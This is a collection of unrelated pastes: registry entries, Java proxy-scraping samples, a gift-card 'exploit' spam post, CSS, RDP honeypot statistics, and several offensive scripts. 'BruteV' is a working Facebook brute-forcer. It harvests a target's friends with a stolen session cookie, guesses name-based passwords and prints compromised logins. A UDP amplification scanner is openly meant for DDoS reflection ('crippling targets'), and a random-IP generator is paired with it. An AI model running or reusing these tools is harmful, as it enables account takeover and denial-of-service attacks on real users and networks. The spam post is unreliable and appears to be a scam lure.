@=""explorer \""C:\\Users\\Najeeb\\AppData\\Local\\Temp\""""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\pre]
@=""Prefetch""
""icon""=""SOF.dll,35""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\pre\command]
@=""explorer \""C:\\Windows\\Prefetch\""""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\py]
@=""Python""
""icon""=""SOF.dll,51""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\py\command]
@=""explorer \""D:\\PYTHON-SCRIPTS\""""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\por]
@=""Portable""
""icon""=""SOF.dll,148""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\por\command]
@=""explorer \""F:\\PORTABLE\""""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\soft]
@=""SOFT-HOME(Spaec)""
""icon""=""SOF.dll,38""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\soft\command]
@=""cmd.exe /k start C:\\CMDER\\SOFT\\SOFT-HOME.ahk""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\tool]
@=""TOOLS-HOME""
""icon""=""SOF.dll,39""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\tool\command]
@=""cmd.exe /k start C:\\CMDER\\TOOLS\\TOOL.ahk""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\home]
@=""CMD-HOME(Spaec)""
""icon""=""SOF.dll,109""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\home\command]
@=""cmd.exe /k start C:\\CMDER\\HOME.ahk""


"
6gci4Jrg,Untitled,dereksir,Java,Monday 29th of April 2024 09:41:05 PM CDT,"package com.example;

// import the required classes
import java.io.IOException;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Main {
    // create a new OkHttpClient instance
    final OkHttpClient client = new OkHttpClient();

    String run(String url) throws IOException {
        // create a request with the provided URL
        Request request = new Request.Builder()
            .url(url)
            .build();
        // execute the request and obtain the response
        try (Response response = client.newCall(request).execute()) {
            // return the response body as a string
            return response.body().string();
        }
    }

    public static void main(String[] args) throws IOException {
        // create an instance of the Main class
        Main example = new Main();
        // make a GET request to the specified URL and print the response
        String response = example.run(""https://api.zenrows.com/v1/?apikey=<YOUR_ZENROWS_API_KEY>&url=https%3A%2F%2Fwww.amazon.com%2FLumineux-Teeth-Whitening-Strips-Treatments-Enamel-Safe%2Fdp%2FB082TPDTM2%2F%3Fth%3D1&js_render=true&premium_proxy=true&autoparse=true"");
        System.out.println(response);
    }
}"
aZg8QpSR,Untitled,dereksir,Java,Monday 29th of April 2024 09:28:16 PM CDT,"package com.example;

// import the necessary classes
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import okhttp3.*;

public class Main {
		// define a proxy pool
       private static final List<ProxyInfo> proxyList = new ArrayList<>();
 
    static {
        proxyList.add(new ProxyInfo(""140.238.247.9"", 8100));
        proxyList.add(new ProxyInfo(""213.188.211.61"", 3128));
        proxyList.add(new ProxyInfo(""67.43.227.229"", 20195));
    }

	// create static proxyInfo class
    static class ProxyInfo {
        String host;
        int port;

        ProxyInfo(String host, int port) {
            this.host = host;
            this.port = port;
        }
    }

	String run(String url) throws IOException {
        // randomly select a proxy from the list
        Random random = new Random();
        int index = random.nextInt(proxyList.size());
        ProxyInfo proxyInfo = proxyList.get(index);

		// create a proxy object with the selected proxy details
        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyInfo.host, proxyInfo.port));
		
		// create a OkHttpClient builder instance and configure it to use the proxy
        OkHttpClient client = new OkHttpClient.Builder()
            .proxy(proxy)
            .build();

        // create a request with the provided URL
        Request request = new Request.Builder()
            .url(url)
            .build();
        // execute the request and obtain the response
        try (Response response = client.newCall(request).execute()) {
            // return the response body as a string
            return response.body().string();
        }
    }

    public static void main(String[] args) throws IOException {
        // create an instance of the Main class
        Main example = new Main();
        // make a GET request to the specified URL and print the response
        String response = example.run(""https://www.amazon.com/Lumineux-Teeth-Whitening-Strips-Treatments-Enamel-Safe/dp/B082TPDTM2/?th=1"");
        System.out.println(response);
    }

}"
ERZQEeEV,Untitled,dereksir,Bash,Monday 29th of April 2024 09:25:12 PM CDT,"{
  ""origin"": ""140.238.247.9:60163""
}

{
  ""origin"": ""213.188.211.61:51103""
}"
E0a26gEU,Untitled,dereksir,Java,Monday 29th of April 2024 09:19:53 PM CDT,"package com.example;

// import the necessary classes
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import okhttp3.*;

public class Main {
		// define a proxy pool
       private static final List<ProxyInfo> proxyList = new ArrayList<>();
 
    static {
        proxyList.add(new ProxyInfo(""140.238.247.9"", 8100));
        proxyList.add(new ProxyInfo(""213.188.211.61"", 3128));
        proxyList.add(new ProxyInfo(""67.43.227.229"", 20195));
    }

	// create static proxyInfo class
    static class ProxyInfo {
        String host;
        int port;

        ProxyInfo(String host, int port) {
            this.host = host;
            this.port = port;
        }
    }

	String run(String url) throws IOException {
        // randomly select a proxy from the list
        Random random = new Random();
        int index = random.nextInt(proxyList.size());
        ProxyInfo proxyInfo = proxyList.get(index);

		// create a proxy object with the selected proxy details
        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyInfo.host, proxyInfo.port));
		
		// create a OkHttpClient builder instance and configure it to use the proxy
        OkHttpClient client = new OkHttpClient.Builder()
            .proxy(proxy)
            .build();

        // create a request with the provided URL
        Request request = new Request.Builder()
            .url(url)
            .build();
        // execute the request and obtain the response
        try (Response response = client.newCall(request).execute()) {
            // return the response body as a string
            return response.body().string();
        }
    }

    public static void main(String[] args) throws IOException {
        // create an instance of the Main class
        Main example = new Main();
        // make a GET request to the specified URL and print the response
        String response = example.run(""https://httpbin.io/ip"");
        System.out.println(response);
    }

}"
017vxKRV,Untitled,dereksir,Java,Monday 29th of April 2024 09:03:48 PM CDT,"//...
String run(String url) throws IOException {
	// randomly select a proxy from the list
	ProxyInfo proxyInfo = getRandomProxy();

	// Create a proxy object with the selected proxy details
	Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyInfo.host, proxyInfo.port));

}"
Avdqsn3Q,Untitled,dereksir,Java,Monday 29th of April 2024 08:59:21 PM CDT," static class ProxyInfo {
        String host;
        int port;

        ProxyInfo(String host, int port) {
            this.host = host;
            this.port = port;
        }
    }"
SSwAXP8F,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,Osvaldorino,GetText,Monday 29th of April 2024 08:55:06 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_340390.pdf

Working as of:
30 April 2024"
FLmVvtzm,Untitled,jabela,Python,Monday 29th of April 2024 08:51:46 PM CDT,"class Bird:
    def __init__(self, name, nativeTo, diet, conservation):
        self.name = name
        self.nativeTo = nativeTo
        self.diet = diet
        self.conservation = conservation

    def __str__(self):
        return (f""Name: {self.name}, ""
                f""Native To: {self.nativeTo}, ""
                f""Diet: {self.diet}, ""
                f""Conservation Status: {self.conservation}"")

# Sample bird
eagle = Bird(""Eagle"", ""North America"", ""Carnivore"", ""Least Concern"")
print(eagle)
"
K9TE8DNQ,Blight,branch_m,JavaScript,Monday 29th of April 2024 08:35:31 PM CDT,"var count=0;const tz=""Asia/Tokyo"";const ty=""2-digit"";
const s=c[""playerstats""][""stats""];
for(var i=0;i<s.length;i++){
    if(s[i].name==""DBD_Chapter17_Slasher_Stat1""){count = s[i].value;break;}};"
1ktG4rnw,Untitled,dereksir,Java,Monday 29th of April 2024 08:27:51 PM CDT,"package com.example;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;

import okhttp3.*;

public class Main {

    String run(String url) throws IOException {
        // define your proxy details
        String proxyHost = ""140.238.247.9"";
        int proxyPort = 8100;

        // create a proxy object and pass in the necessary details
        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));

        // create a OkHttpClient builder instance and configure it to use the proxy
        OkHttpClient client = new OkHttpClient.Builder()
            .proxy(proxy)
            .authenticator(new Authenticator() {
                @Override
                public Request authenticate(Route route, Response response) throws IOException {
                    // provide the credentials
                    String credential = Credentials.basic(""username"", ""password"");
                    return response.request().newBuilder()
                            .header(""Proxy-Authorization"", credential)
                            .build();
                }
            }) 
            .build();

        // create a request with the provided URL
        Request request = new Request.Builder()
            .url(url)
            .build();
        // execute the request and obtain the response
        try (Response response = client.newCall(request).execute()) {
            // return the response body as a string
            return response.body().string();
        }
    }

    public static void main(String[] args) throws IOException {
        // create an instance of the Main class
        Main example = new Main();
        // make a GET request to the specified URL and print the response
        String response = example.run(""https://httpbin.io/ip"");
        System.out.println(response);
    }
}"
vAB8neP3,Untitled,dereksir,Java,Monday 29th of April 2024 08:25:59 PM CDT," @Override
// pass the route and response object in the authenticate method
public Request authenticate(Route route, Response response) throws IOException {

}"
EkSGuxhH,Untitled,dereksir,Java,Monday 29th of April 2024 08:24:29 PM CDT,"// create a OkHttpClient builder instance and configure it to use the proxy
OkHttpClient client = new OkHttpClient.Builder()
	.proxy(proxy)
	.authenticator(new Authenticator() {
 		@Override
 		public Request authenticate(Route route, Response response) throws IOException {
			// If the proxy requires authentication, provide the credentials
			String credential = Credentials.basic(proxyUsername, proxyPassword);
			return response.request().newBuilder()
				.header(""Proxy-Authorization"", credential)
				.build()
			}
		}) 
		.build();"
hXv5ssVp,Untitled,dereksir,Java,Monday 29th of April 2024 08:19:05 PM CDT,"// provide the credentials
String credential = Credentials.basic(""username"", ""password"");
return response.request().newBuilder()
		.header(""Proxy-Authorization"", credential)
		.build();"
iJxURCbt,Untitled,dereksir,Java,Monday 29th of April 2024 08:00:16 PM CDT,"	String run(String url) throws IOException {
		//...

        OkHttpClient client = new OkHttpClient.Builder()
            .proxy(proxy)
			// create instance of Authenticator interface. 
            .authenticator(new Authenticator() {

			}) 

	}"
R3DcsvLJ,140.213.39.76-BruteV.py.py,OBF-XIn,Python,Monday 29th of April 2024 07:56:10 PM CDT,"try:
	import os, sys, time, random, requests, re, json
	from concurrent.futures import ThreadPoolExecutor as run
	from bs4 import BeautifulSoup as parser
	from datetime import datetime
except ImportError as e:exit(""[Error] module is not installed, please type pip install -r requirement.txt"")

Banner = """"""
\033[0;37m    ____             __     _    __
   / __ )_______  __/ /____| |  / /  @_> BruteV By ZexDev4
  / __  / ___/ / / / __/ _ \ | / /   @_> Version \033[0;32m0.1\033[0;37m
 / /_/ / /  / /_/ / /_/  __/ |/ /    @_> \033[0;32mgithub.com/ZexDev4\033[0;37m
/_____/_/   \__,_/\__/\___/|___/     ----------------------
""""""

all_android = []
list_ugen = open('samsung-unnamed_2.txt').read().splitlines()
for sm in list_ugen:
	all_android.append(sm)

class Login:
	def __init__(self):
		self.hitung = 0

	def waktu(self):
		now = datetime.now()
		hours = now.hour
		if 4 <= hours < 12:timenow = ""Pagi ""
		elif 12 <= hours < 15:timenow = ""Siang""
		elif 15 <= hours < 18:timenow = ""Sore""
		else:timenow = ""Malam""
		return timenow

	# source convert cookie to token: https://github.com/Dapunta
	def Convert(self, coki):
		self.data = {}
		try:
			with requests.Session() as r:
				self.r = r.post(f'https://graph.facebook.com/v2.6/device/login?access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038').json()
				self.user_code, self.code = self.r['user_code'], self.r['code']
				self.r1 = parser(r.get(f'https://m.facebook.com/device?user_code={self.user_code}', cookies = {'cookie':coki}).text,'html.parser')
				self.ls = ['fb_dtsg','jazoest','qr']
				for self.i in self.r1.find_all('input'):
					if self.i.get('name') in self.ls: self.data.update({self.i['name']:self.i['value']})
				self.data.update({'user_code':self.user_code})
				self.ul = self.r1.find('form', method='post')['action']
				self.r2 = parser(r.post('https://m.facebook.com' + self.ul, data=self.data, cookies = {'cookie':coki}).text,'html.parser')
				self.data.clear()
				for self.a in self.r2.find_all('input'):
					if self.a.get('name') == '__CANCEL__':pass
					else:self.data.update({self.a.get('name','submit'):self.a.get('value')})
				self.r3 = r.post('https://m.facebook.com' + self.r2.find('form', method='post')['action'], data=self.data, cookies = {'cookie':coki}).text
				self.r4 = r.post(f'https://graph.facebook.com/v2.6/device/login_status?access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038&code={self.code}',cookies = {'cookie':coki}).json()['access_token']
				try:
					info = requests.get(f""https://graph.facebook.com/me?access_token={self.r4}"", cookies = {""cookie"": coki}).json()
					nama, id = info['name'], info['id']
				except KeyError:exit(f""\033[0;37m[\033[0;31m!\033[0;37m] Cookies anda sudah kadelwarsa"")
				print (f""\033[0;37m[\033[0;32m√\033[0;37m] Halo \033[0;32m`{nama}`\033[0;37m, selamat {self.waktu()} >_"")
				open("".config.json"", ""w"").write(json.dumps({""cookie"": f""{coki}"", ""token"": f""{self.r4}""}))
				exit()
		except Exception as e:exit(f""\033[0;37m[\033[0;31m!\033[0;37m] Cookies anda sudah kadelwarsa"",e)

	def Cookies(self):
		os.system('clear');print (Banner)
		self.Convert(input(""\033[0;37m[\033[0;33m?\033[0;37m] Masukan Cookie Anda:\033[0;32m ""))

class GetTarget:
	def __init__(self):
		self.url, self.username = ""https://graph.facebook.com/{}"", []

	def Friend(self, user, cookie, token):
		try:
			for _ in requests.get(self.url.format(f'{user}?fields=id,name,friends&access_token={token}'), cookies = {'cookie':cookie}).json()['friends']['data']:
				self.username.append(f""{_['id']}|{_['name']}"")
				sys.stdout.write(f""\r\033[0;37m[\033[0;32m+\033[0;37m] Sedang Mengumpulkan Target \033[0;32m{len(self.username)}\033[0;37m|\033[0;32m{_['id']}""),sys.stdout.flush()
				time.sleep(0.003)
		except:pass
		return self.username

class BrutePass:
	def __init__(self):
		self.url = ""https://m.facebook.com""
		self.loop, self.live, self.sesi = 0, 0, 0

	def SetPassword(self, username):
		UserRand, tpw = [], []
		for __ in username:
			xx = random.randint(0,len(username))
			UserRand.insert(xx,__)
		mpw = input(f""\n\033[0;37m[\033[0;33m?\033[0;37m] Inggin menambahkan password manual? \033[0;32mY\033[0;37m/\033[0;33mT\033[0;37m:\033[0;32m "")
		if mpw in [""y"",""Y""]:
			pwls = input(f""\033[0;37m[\033[0;32m+\033[0;37m] Example: \033[0;33mbandung,sayang\033[0;37m:\033[0;32m "").split("","")
			for lspw in pwls:
				tpw.append(lspw)
		print (f""             \033[0;37m[ \033[0;32mTarget Bruteforce Process \033[0;37m]\n"")
		with run(max_workers=30) as start:
			for ___ in UserRand:
				uid, fullname = ___.split(""|"")[0], ___.split(""|"")[1].lower()
				firstname = fullname.split("" "")[0]
				psswlist = []
				if len(fullname)<6:
					if len(firstname)<3:pass
					else:
							psswlist.append(fullname)
							psswlist.append(firstname+'123')
							psswlist.append(firstname+'12345')
				else:
					if len(firstname)<3:psswlist.append(fullname)
					else:
							psswlist.append(fullname)
							psswlist.append(firstname+'123')
							psswlist.append(firstname+'12345')
				if mpw in [""y"",""Y""]:
					for npw in tpw:
						psswlist.append(npw)
				start.submit(self.method, uid, psswlist, username)
		exit(f""\n\033[0;37m[\033[0;32m+\033[0;37m] Bruteforce selesai, Results Live:\033[0;32m{self.live} \033[0;37m- Check:\033[0;31m{self.sesi}"")

	def method(self, user, paswd, total):
		session = requests.session()
		sys.stdout.write(f""\r\r\033[0;37m[\033[0;31m#\033[0;37m] \033[0;32mBruteV \033[0;37m{len(total)}/\033[0;37m{self.loop}, Live:\033[0;32m{self.live}\033[0;37m, Check:\033[0;33m{self.sesi}\033[0;37m, User-agent:\033[0;34m{len(all_android)}"");sys.stdout.flush()
		ua = random.choice(all_android)
		for pw in paswd:
			try:
				head = {
					'Host': 'm.facebook.com',
					'cache-control': 'max-age=0',
					'dpr': '1.5625',
					'viewport-width': '980',
					'sec-ch-ua': 'Google',
					'sec-ch-ua-mobile': '?1',
					'sec-ch-ua-platform': 'Android',
					'upgrade-insecure-requests': '1',
					'user-agent': ua,
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'sec-fetch-site': 'none',
					'sec-fetch-mode': 'navigate',
					'sec-fetch-user': '?1',
					'sec-fetch-dest': 'document',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				}
				params = {'uid': user,'flow': 'login_no_pin','next': '/creatorstudio/?reference=visit_from_seo','refsrc': 'deprecated','_rdr': '',}
				link = session.get('https://m.facebook.com/login/device-based/password/', params=params, headers=head)

				kuki = 'datr=ufhMZWEcSCUIHQitVBSZt5eD;'
				kuki+= ';'.join([key+'='+value for key, value in session.cookies.get_dict().items()])
				cookies = {'cookie': kuki}
				headers = {
					'Host': 'm.facebook.com',
					'cache-control': 'max-age=0',
					'dpr': '1.5625',
					'viewport-width': '980',
					'sec-ch-ua': 'Google',
					'sec-ch-ua-mobile': '?1',
					'sec-ch-ua-platform': 'Android',
					'upgrade-insecure-requests': '1',
					'origin': 'https://m.facebook.com',
					'content-type': 'application/x-www-form-urlencoded',
					'user-agent': ua,
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'navigate',
					'sec-fetch-user': '?1',
					'sec-fetch-dest': 'document',
					'referer': 'https://m.facebook.com/login/device-based/password/?uid=100090093264629&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				}
				data = {
					'lsd': re.search('name=""lsd"" value=""(.*?)""', str(link.text)).group(1),
					'jazoest': re.search('name=""jazoest"" value=""(.*?)""', str(link.text)).group(1),
					'uid': user,
					'next': 'https://m.facebook.com/login/save-device/',
					'flow': 'login_no_pin',
					'encpass': f'#PWD_BROWSER:0:{int(datetime.now().timestamp())}:{pw}',
				}
				params = {'shbl': '0',}
				resp = session.post('https://m.facebook.com/login/device-based/validate-password/',params=params,cookies=cookies,headers=headers,data=data)
				if ""c_user"" in session.cookies.get_dict():
					coki = (';'.join([key+'='+value for key, value in session.cookies.get_dict().items()]))
					print (f""\r\r \033[0;37m[\033[0;32m√\033[0;37m] Id/pw: \033[0;32m{user}\033[0;37m/\033[0;32m{pw}\n\033[0;32m{coki}\033[0;37m{ua}"")
					self.live += 1
					break
				elif ""checkpoint"" in session.cookies.get_dict():
					print (f""\r\r \033[0;37m[\033[0;31mx\033[0;37m] Id/pw: \033[0;31m{user}\033[0;37m/\033[0;31m{pw}            "")
					self.sesi += 1
					break
				else:continue
			except requests.exceptions.ConnectionError:time.sleep(31)
			except Exception as e:exit(e)
		self.loop += 1
class MainMenu:
	def __init__(self):
		if os.path.isfile('.config.json') is True:
			self.account = json.loads(open("".config.json"").read())
			try:
				info = requests.get(f""https://graph.facebook.com/me?access_token={self.account['token']}"", cookies = {""cookie"": self.account['cookie']}).json()
				self.nama, self.id = info['name'], info['id']
			except KeyError:print(f""\033[0;37m[\033[0;31m!\033[0;37m] Cookies anda sudah kadelwarsa"");time.sleep(2);Login().Cookies()
		else:print(f""\033[0;37m[\033[0;31m!\033[0;37m] cookie tidak ada"");time.sleep(2);Login().Cookies()

	def BruteV(self):
		os.system('clear');print (Banner)
		print (f""\033[0;37m[\033[0;34m@\033[0;37m] Full name: \033[0;32m{self.nama}"")
		print (f""\033[0;37m[\033[0;34m@\033[0;37m] Userid   : \033[0;32m{self.id}\n"")
		print (f""\033[0;37m[\033[0;33m?\033[0;37m] Note     : Jika ingin lebih dari 1 id bisa menggunakan 'id1,id2'"")
		target = input(f""[\033[0;32m+\033[0;37m] Id Target:\033[0;37m "").split("","")
		for _ in target:
			results = GetTarget().Friend(_, self.account['cookie'], self.account['token'])
		if len(results) == 0:exit(f""\033[0;37m[\033[0;31m!\033[0;37m] Id Target private"")
		print ()
		BrutePass().SetPassword(results)

if __name__=='__main__':
	MainMenu().BruteV()
"
f40tqjeM,Exercicios29,Smokahontas,C,Monday 29th of April 2024 07:46:33 PM CDT,Fazer
857DzTFF,ip_generator.py,betrayed,Python,Monday 29th of April 2024 07:35:31 PM CDT,"import os, random
from colorama import Fore
os.system('clear')

print(Fore.RED + '''
  ___ ___      _ _     ___                       _           
 |_ _| _ \__ _| | |   / __|___ _ _  ___ _ _ __ _| |_ ___ _ _ 
  | ||  _/\ V /_  _| | (_ / -_) ' \/ -_) '_/ _` |  _/ _ \ '_|
 |___|_|   \_/  |_|   \___\___|_||_\___|_| \__,_|\__\___/_|  
                                                             
''')
try:
    num = int(input(Fore.WHITE + ' Number of IP address/s to generate: '))
    txt = input(' Name of output file (ex hosts.txt): ')
except KeyboardInterrupt:
    sys.exit(Fore.YELLOW + ' \r\nAborted by user.\r\n')
except:
    sys.exit(Fore.RED + ' \r\nInput error detected!\r\n')
    
print('\r\n')

try:
    with open(txt, 'w') as file:
        for _ in range(num):
            _ip = ""."".join(str(random.randint(0, 255)) for _ in range(4))
            print(Fore.WHITE + ' Writing IP ' + Fore.GREEN + _ip + Fore.WHITE + ' to file.')
            file.write(_ip + '\n')
except KeyboardInterrupt:
    sys.exit(Fore.YELLOW + ' \r\nAborted by user.\r\n')

print(Fore.WHITE + '\r\n Done!')
"
MLAdDiuh,udp_amp_scanner.py,betrayed,Python,Monday 29th of April 2024 07:35:09 PM CDT,"# Scanner for vulnerable UDP services that are subject to reflection/amplification DDoS attacks
# This script supports both UDP and SYN stealth scans. Some UDP services accept or at least respond
# to SYN requests, hence why it is included as an option in addition to generic UDP scans.

# So far I've found over a thousand vulnerable DNS, NTP, UBIQUITI, DVR, and WS-Discovry (WSD) 
# machines while using this tool.

# Known bugs: CTRL+C must be spammed a few times in order to abort your scan since I'm not a 
# master at python programming and the thread handling for this is garbage. Other than that, 
# you're set. Have fun crippling targets with your new lists.

# The script to generate IP addresses to scan will be posted following this tool. Stand by...


import os, sys, time, socket
from scapy.all import *

_abort = False

def main():
    global _abort
    os.system('clear')
    
    if len(sys.argv) != 6:
        sys.exit('\r\n\033[1m\033[37m   USAGE: <IP-LIST.TXT> <OUTPUT.TXT> <TIMEOUT SEC> <WAIT SEC> <METHOD:SYN/UDP>')
    
    if not os.geteuid() == 0:
        sys.exit('\r\n\033[1m\033[31m   SCRIPT REQUIRES ROOT ELEVATION!')

    if not (sys.argv[5].lower() == ""udp"" or sys.argv[5].lower() == ""syn""):
        sys.exit('\r\n\033[1m\033[31m ERROR! INVALID METHOD. EXITING...')

    print('''\033[1m\033[37m
      █████╗   ███╗   ███╗  ██████╗        ███████╗   ██████╗ ██╗  ██╗
    ██╔══██║  ████║▄████╔╝ ██╔══██║       ██╔═════╝  ██╔══██║ ██║ ██╔╝
   ███████╔╝ ██╔████╔██╔╝ ███████╔╝█████╗███████╗   ██████╔═╝ ▀████╔╝
  ██╔══██╔╝ ██╔╝██╔═██╔╝ ██╔═════╝ ╚════╝╚════██║  ██╔════╝    ██╔═╝
 ██╔╝ ██╔╝ ██╔╝ ╚═╝██╔╝ ██╔╝            ███████╔╝ ██╔╝        ██╔╝
 ╚═╝  ╚═╝  ╚═╝     ╚═╝  ╚═╝             ╚══════╝  ╚═╝         ╚═╝
 ''')
 
    _online = []
    i = 0
    
    try:
        with open(sys.argv[1], 'r') as f:
            for line in f:
                if _abort == True:
                    sys.exit(""\033[1m\033[31m ABORTED BY USER..."")
                    break
                # retrieve IP:PORT
                try:
                    _ip, _prt = line.strip().split(':')
                except:
                    print('\033[1m\033[37m[{}]'.format(str(i)) + '\033[1m\033[34mANOMALY DETECTED @ LINE ENTRY ""' + line + '""')

                i +=1
                if sys.argv[5].lower() == ""syn"":
                #  ___ _   _ _ __  
                # / __| | | | '_ \ 
                # \__ \ |_| | | | |
                # |___/\__, |_| |_|
                #      |___/         
                    try:
                        response = sr1(IP(dst=_ip)/TCP(dport=int(_prt), flags=""S""), timeout=int(sys.argv[3]), verbose=0)
                        if response and response.haslayer(TCP):
                            if response[TCP].flags == 0x12:
                                # open
                                print('\033[1m\033[37m[{}]'.format(str(i)) + '\033[1m\033[32m ------> OPEN @ ' + _ip + ':' + _prt)
                                success = _ip + "":"" + _prt
                                _online.append(success)
                            else:
                                # closed/filtered
                                print('\033[1m\033[37m[{}]'.format(str(i)) + '\033[1m\033[31m TIMEOUT @ ENDPOINT ' + _ip + ':' + _prt)
                        else:
                            print('\033[1m\033[37m[{}]'.format(str(i)) + '\033[22m\033[31m SYN/ACK NOT RECEIVED. REJECTED BY ENDPOINT ' + _ip + ':' + _prt)
                    except KeyboardInterrupt:
                        sys.exit()
                    except:
                        pass
                    
                else:
                #            _       
                #  _   _  __| |_ __  
                # | | | |/ _` | '_ \ 
                # | |_| | (_| | |_) |
                #  \__,_|\__,_| .__/ 
                #             |_|  
                    try:
                        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        udp_socket.settimeout(1)  # Set a timeout for the connection attempt
                        udp_socket.sendto(b'', (_ip, int(_prt)))
                        data, addr = udp_socket.recvfrom(1024)  # Receive response
                        # open
                        print('\033[1m\033[37m[{}]'.format(str(i)) + '\033[1m\033[32m ------> OPEN @ ' + _ip + ':' + _prt)
                    except KeyboardInterrupt:
                        sys.exit()
                    except:
                        print('\033[1m\033[37m[{}]'.format(str(i)) + '\033[22m\033[31m SYN/ACK NOT RECEIVED. REJECTED BY ENDPOINT ' + _ip + ':' + _prt)
            
    except KeyboardInterrupt:
        # user abort via ctrl+c
        _abort = True 
    except ValueError:
        # malformed string formate
        print('\033[1m\033[37m[{}]'.format(str(i)) + '\033[1m\033[34mANOMALY DETECTED @ LINE ENTRY ""' + line + '""')
    except:
        # who knows lol
        print('\033[1m\033[31mCRITICAL ERROR ENCOUNTERED!')
    
    # save all open ports to output file
    print('\r\n\033[1m\033[37mDUMPING OPEN PORTS TO OUTPUT FILE. PLEASE STAND-BY...')
    try:
        with open(sys.argv[2], 'w') as file:
            for item in _online:
                file.write(item + '\n')
    except KeyboardInterrupt:
        sys.exit()
    except:
        print('\033[1m\033[31mERROR ENCOUNTERED WHEN WRITING TO FILE!')
    
    # remove root file-attribute from output file
    try:
        current_mode = os.stat(sys.argv[2]).st_mode
        new_mode = current_mode & ~0o4000
        os.chmod(file_path, new_mode)
    except:
        pass

    sys.exit('\r\n\033[1m\033[37mJOB FINISHED.')
         
if __name__ == ""__main__"":
    main()"
T3xkBZd6,Fish Background CSS,TheiPhoneFan,HTML,Monday 29th of April 2024 07:22:45 PM CDT,"    <style>
        @media (max-width: 983px) {
            .flex-box {
                flex-direction: column;
            }
        }

        .twitter-share-button {
            text-align: center !important;
        }

        .banner {
            height: 280px;
            width: 100%;
            background-image: url('./assets/featured-image.png');
            background-size: cover;
            border-radius: 16px;
            display: flex;
            flex-direction: column; /* Change to column direction */
            justify-content: center;
            align-items: center;
            background-position: center;
            overflow: hidden; /* Ensure content doesn't overflow */
        }

        .banner h1 {
            font-family: 'Lora', serif;
            font-weight: bold;
            color: #86b3de;
            -webkit-text-stroke-width: 3px;
            -webkit-text-stroke-color: #436584;
            font-size: 75px;
            text-align: center;
            margin: 0;
        }

        .social-icons {
            margin-top: -7px; /* Adjust as needed */
        }

        .social-icons a {
            text-decoration: none;
        }

        .navbar {
            border-radius: 13px !important;
        }
    </style>"
3vP13qg6,2024-04-29_stats.json,rdp_snitch,JSON,Monday 29th of April 2024 07:18:00 PM CDT,"{
  ""ip"": {
    ""167.94.138.49"": 3,
    ""187.190.60.112"": 3,
    ""87.251.75.145"": 9,
    ""180.93.172.108"": 3,
    ""107.167.82.123"": 6,
    ""205.210.31.67"": 9,
    ""103.238.234.199"": 6,
    ""212.70.149.142"": 18,
    ""185.170.144.3"": 6,
    ""194.165.16.11"": 6,
    ""103.120.19.98"": 3,
    ""87.251.75.120"": 6,
    ""45.227.254.26"": 6,
    ""128.14.239.39"": 3,
    ""154.27.71.58"": 6,
    ""198.235.24.57"": 9,
    ""62.204.41.225"": 12,
    ""36.91.222.100"": 6,
    ""43.250.254.49"": 3,
    ""116.140.196.215"": 3,
    ""112.4.139.162"": 3,
    ""212.41.9.9"": 9,
    ""198.235.24.143"": 9,
    ""81.19.135.47"": 18,
    ""172.104.185.182"": 75,
    ""123.56.20.194"": 6,
    ""80.66.76.134"": 3,
    ""84.201.2.2"": 6,
    ""159.65.82.237"": 225,
    ""62.204.41.215"": 6,
    ""194.165.16.73"": 12,
    ""167.94.146.48"": 3,
    ""205.210.31.207"": 9
  },
  ""asn"": {
    ""AS398324"": 3,
    ""AS22884"": 3,
    ""AS208091"": 18,
    ""AS135944"": 3,
    ""AS53755"": 6,
    ""AS396982"": 36,
